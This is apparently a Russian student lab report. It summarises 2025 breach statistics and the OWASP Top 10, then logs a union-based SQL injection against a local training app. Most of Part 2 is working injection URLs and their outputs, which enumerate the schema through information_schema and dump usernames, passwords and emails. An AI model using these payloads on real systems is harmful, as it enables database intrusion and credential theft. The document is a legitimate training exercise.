# Отчёт о работе
## Часть 1
### Источники
- https://www.verizon.com/business/resources/T16f/reports/2025-dbir-data-breach-investigations-report.pdf
- https://owasp.org/Top10/2025/
- https://ptsecurity.com/research/analytics/aktual-nye-kiberugrozy-i-ii-kvartaly-2025-goda/#id1
- https://lp.kaspersky.com/global/ksb2025/

### Доля успешных атак на организации с использованием веб-уязвимостей
Найти данные конкретно по веб-уязвимостям представляется довольно сложным, так как большинство источников не выделяют их в отдельную категорию, вместо этого группируя с уязвимостями в целом. Впрочем, не везде. Так, например, в Verizon DBIR пишется, что 20% взломов проходили с использованием уязвимостей, при этом в 42% случаев через веб-приложение. Таким образом, (если я нигде не запутался в терминологии), доля атак с использованием веб-уязвимостей — **8,4%**.
Впрочем, по другим данных из этого же отчёта можно сделать вывод, что доля "базовых веб атак" составляет 12%, и. откровенно говоря, я довольно смутно понимаю, какое из этих чисел использовать. Оставлю оба.
Впрочем, с российским рынком поиск данных становится уже несколько сложней. Так, согласно отчёту Positive Technologies о актуальных киберугрозах за I-II кварталы 2025 года, **31%** процент успешных атак происходил с эксплуатацией уязвимостей, при этом не прописывается, какая их часть касалась веб-уязвимостей.
Лаборатория Касперского, напротив, разбивает свою аналитику по различным секторам. Так, в секторе телекоммуникаций 12.79% пользователей сталкивались с веб-угрозами, в ретейл секторе — 14.41%, в банкинге — 8.15% сталкивались с онлайн-угрозами. Отсутствие информации о доле успешных атак и в целом некоторая нехватка данных не позволяют сделать по этим данным однозначных выводов, но привести их всё же стоит.   

### Распределение по конкретным уязвимостям
Согласно OWASP Top 10 за 2025 год, 10 самых частых веб-уязвимостей в порядке убывания— это:
1. **Broken Access Control** : AIR 3.74% | AC 42.93%
2. **Security Misconfiguration** : AIR 3.00% | AC 52.35%
3. **Software Supply Chain Failures**  : AIR 5.72% | AC 27.47%
4. **Cryptographic Failures** : AIR 3.80% | AC 47.74%
5. **Injection** : AIR 3.08% | AC 42.93%
6. **Insecure Design** : AIR 1.86% | AC 35.18%
7. **Authentication Failures** : AIR 2.92% | AC 37.14%
8. **Software or Data Integrity Failures** : AIR 2.75% | AC 45.49%
9. **Security Logging and Alerting Failures** : AIR 3.91% | AC 46.48%
10. **Mishandling of Exceptional Conditions** : AIR 2.95% | AC 37.95%

## Часть 2
Окей, начали, смотрю, устанавливаю базу. Просит id.
http://localhost:8080/task/1 : Получаю Not Found, потому что это так не работает.
http://localhost:8080/task/?1 : то же самое, потому что это всё ещё так не работает
http://localhost:8080/task/?id=1 : `Ваш id:1 Ваш логин:admin` 
Прекрасно, прогресс.
http://localhost:8080/task/?id=''OR1=1 : `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''OR1=1'' LIMIT 0,1' at line 1`
Добавляю плюс там, где должен быть пробел, перебираю кавычки, не работает. Ну хотя бы теперь знаю, что это MySQL.
Меняю id на 2 — http://localhost:8080/task/?id=2 : `Ваш id:2  Ваш логин:Volk`
http://localhost:8080/task/?id=3 : `Ваш id:3  Ваш логин:Matroskin`
http://localhost:8080/task/?id=4 : `Ваш id:4  Ваш логин:Vinni-pukh`
http://localhost:8080/task/?id=5 :  `Ваш id:5  Ваш логин:Neznaika`
http://localhost:8080/task/?id=6 : `Ваш id:6  Ваш логин:kotenok`
http://localhost:8080/task/?id=7 : `Ваш id:7 Ваш логин:Karlson
Так может долго продолжаться. Смотрю 
http://localhost:8080/task/?id=99 : " "
http://localhost:8080/task/?id=10 : " "
http://localhost:8080/task/?id=9 : `Ваш id:9  Ваш логин:Volk2`
(где-то в этот момент я попытался уронить таблицу, потому что *ну надо*. Пока безуспешно. Пока.)
Вспоминаю, что возможно кавычек в запросе нет.
http://localhost:8080/task/?id=+OR+1=1 : " "
Решаю вспомнить синтаксис 
http://localhost:8080/task/?id=9+UNION+SELECT+*+FROM+TABLE+users-- : `Ваш id:9  Ваш логин:Volk2`
http://localhost:8080/task/?id=%27%27+UNION+SELECT+*+FROM+TABLE+users-- : " "
http://localhost:8080/task/?login=volk2 : `Введите в качестве параметра ваш id`
Посмотрел примеры синтакиса MySQL. Понял, что после коммента надо оставлять пробел. 
http://localhost:8080/task/?id=1%27+ORDER+BY+1--+- : `Ваш id:1 Ваш логин:admin`
http://localhost:8080/task/?id=1%27+ORDER+BY+2--+- : `Ваш id:1 Ваш логин:admin`
http://localhost:8080/task/?id=1%27+ORDER+BY+3--+- : `Ваш id:1 Ваш логин:admin`
http://localhost:8080/task/?id=1%27+ORDER+BY+4--+- : `Unknown column '4' in 'order clause'
Замечательно. Прелестно. У нас 3 столбца. Пытаемся узнать имя базы
http://localhost:8080/task/?id=1%27+UNION+SELECT+1,1,database()--+- : `Ваш id:1 Ваш логин:admin`
Резонно, у нас всего два поля, первые данные всё забивают. Делаем неправильное условие
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+1,1,database()--+- : `Ваш id:1 Ваш логин:1`
*Логично*
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+NULL,NULL,database()--+- :  `Ваш id: Ваш логин:`
***Логично***
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+database(),NULL,NULL--+- : `Ваш id:security  Ваш логин:`
Ладно, кажется, я не такой уж и идиот
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+table_name,NULL,NULL+FROM+security--+- : `Table 'security.security' doesn't exist`
Это всё ещё не так работает
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+table_name,NULL,NULL+FROM+information_schema.tables--+- : `Ваш id:CHARACTER_SETS  Ваш логин:`
*опаааа.wav*
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+column_name,data_type,NULL+FROM+information_schema.columns+WHERE+table_name=%27CHARACTER_SETS%27--+- : `Ваш id:CHARACTER_SET_NAME  Ваш логин:varchar`
Ставлю LIMIT
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+column_name,data_type,NULL+FROM+information_schema.columns+WHERE+table_name=%27CHARACTER_SETS%27+LIMIT+2,1--+- : `Ваш id:DESCRIPTION  Ваш логин:varchar`
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+column_name,data_type,NULL+FROM+information_schema.columns+WHERE+table_name=%27CHARACTER_SETS%27+LIMIT+3,1--+- : `Ваш id:MAXLEN  Ваш логин:bigint`
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+column_name,data_type,NULL+FROM+information_schema.columns+WHERE+table_name=%27CHARACTER_SETS%27+LIMIT+4,1--+- : " "
Кажется, это не та таблица
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+table_name,NULL,NULL+FROM+information_schema.tables+LIMIT+2,1--+- : `Ваш id:COLLATION_CHARACTER_SET_APPLICABILITY  Ваш логин:`
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+table_name,NULL,NULL+FROM+information_schema.tables+LIMIT+3,1--+- : `Ваш id:COLUMNS  Ваш логин:`
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+table_name,NULL,NULL+FROM+information_schema.tables+LIMIT+4,1--+- : `Ваш id:COLUMN_PRIVILEGES  Ваш логин:`
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+table_name,NULL,NULL+FROM+information_schema.tables+LIMIT+5,1--+- : `Ваш id:ENGINES  Ваш логин:`
Ладно, кажется, я ушёл в какие-то системные дебри
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+CHARACTER_SET_NAME,DESCRIPTION,MAXLEN+FROM+CHARACTER_SETS--+- : `Table 'security.CHARACTER_SETS' doesn't exist`
*что*
Загуглил CHARACTER_SETS table SQL. Понял, в чём был неправ. Не понял, почему это не работает.
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+table_name,NULL,NULL+FROM+information_schema.tables+WHERE+TABLE_TYPE=%27BASE+TABLE%27+LIMIT+0,1--+- : `Ваш id:columns_priv  Ваш логин:`
Чёт всё ещё не то
*А*. ***Блять***. Буратино был тупой
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+table_name,NULL,NULL+FROM+information_schema.tables+WHERE+table_schema=%27security%27+LIMIT+0,1--+- :
`Ваш id:emails  Ваш логин:`
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+table_name,NULL,NULL+FROM+information_schema.tables+WHERE+table_schema=%27security%27+LIMIT+1,1--+- :
`Ваш id:users  Ваш логин:`
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+table_name,NULL,NULL+FROM+information_schema.tables+WHERE+table_schema=%27security%27+LIMIT+2,1--+- : " "

http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+column_name,data_type,NULL+FROM+information_schema.columns+WHERE+table_name=%27users%27+LIMIT+0,1--+- : `Ваш id:USER  Ваш логин:char`
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+column_name,data_type,NULL+FROM+information_schema.columns+WHERE+table_name=%27users%27+LIMIT+1,1--+- : `Ваш id:CURRENT_CONNECTIONS Ваш логин:bigint`
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+column_name,data_type,NULL+FROM+information_schema.columns+WHERE+table_name=%27users%27+LIMIT+2,1--+- : `Ваш id:TOTAL_CONNECTIONS  Ваш логин:bigint`
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+column_name,data_type,NULL+FROM+information_schema.columns+WHERE+table_name=%27users%27+LIMIT+3,1--+- : `Ваш id:id  Ваш логин:int`
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+column_name,data_type,NULL+FROM+information_schema.columns+WHERE+table_name=%27users%27+LIMIT+4,1--+- : `Ваш id:username  Ваш логин:varchar`
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+column_name,data_type,NULL+FROM+information_schema.columns+WHERE+table_name=%27users%27+LIMIT+5,1--+- : `Ваш id:password  Ваш логин:varchar`
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+column_name,data_type,NULL+FROM+information_schema.columns+WHERE+table_name=%27users%27+LIMIT+6,1--+- : " "

http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+column_name,data_type,NULL+FROM+information_schema.columns+WHERE+table_name=%27emails%27+LIMIT+0,1--+- : `Ваш id:id  Ваш логин:int`
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+column_name,data_type,NULL+FROM+information_schema.columns+WHERE+table_name=%27emails%27+LIMIT+1,1--+- : `Ваш id:email_id  Ваш логин:varchar`
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+column_name,data_type,NULL+FROM+information_schema.columns+WHERE+table_name=%27emails%27+LIMIT+2,1--+- : " "

http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+username,password,NULL+FROM+users+WHERE+id=0--+- : " "
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+username,password,NULL+FROM+users+WHERE+id=1--+- : `Ваш id:admin  Ваш логин:kjhsd8@j0dfjk3$%jksli`
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+username,password,NULL+FROM+users+WHERE+id=9--+- : `Ваш id:Volk2 Ваш логин:Wa spoiuuuuu`
ехехех
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+username,password,NULL+FROM+users+WHERE+id=5--+- : `Ваш id:Neznaika  Ваш логин:na Lune`
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+username,password,NULL+FROM+users+WHERE+id=4--+- : `Ваш id:Vinni-pukh  Ваш логин:Ya tu4ka-tu4ka-tu4ka`

Осталось разобраться с мылом. В таблице мало столбцов, но надо их посмотреть
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+id,email_id,NULL+FROM+emails+WHERE+id=1--+- : `Ваш id:1  Ваш логин:admin@otus-lab.com`
http://localhost:8080/task/?id=1%27+AND+1=2+UNION+SELECT+id,email_id,NULL+FROM+emails+WHERE+id=4--+- : `Ваш id:4  Ваш логин:honey_lover@otus-lab.com`
УРА

### Ответ
password Volk2 — "Wa spoiuuuuu"
email Vinni-pukh — "honey_lover@otus-lab.com"